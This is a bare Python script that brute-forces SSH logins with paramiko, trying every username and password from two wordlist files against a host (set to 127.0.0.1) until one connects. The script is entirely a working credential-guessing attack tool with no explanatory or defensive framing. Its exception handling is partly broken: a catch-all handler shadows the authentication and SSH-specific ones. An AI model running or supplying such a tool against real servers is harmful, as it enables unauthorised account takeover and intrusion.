

import paramiko, socket,time 

def brute_force_ssh(hostname, port, user, password):
    ssh_client = paramiko.SSHClient()
        
    ssh_client.load_system_host_keys()
        
    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
    try:
        ssh_client.connect(hostname, port=port, username=user, password=password,timeout=3)

    except Exception as error:
        print("socket error",error)
        return False
    except paramiko.AuthenticationException as error:
        print("authentication error",error)
        return False
    except paramiko.SSHException:
        print("try again")
        time.sleep(20)
        return brute_force_ssh(hostname, port, user, password)
    
    else:
        ssh_client.close()
        print('Password found: ' + password)
        return True

hostname = '127.0.0.1' 
port = 22

users = open('users.txt', 'r')

users = users.read().splitlines()

passwords = open('passwords.txt', 'r')

passwords = passwords.read().splitlines()


for user in users:
    for password in passwords:
        if brute_force_ssh(hostname, port, user, password):
            print('Password found: ' + password)
            exit()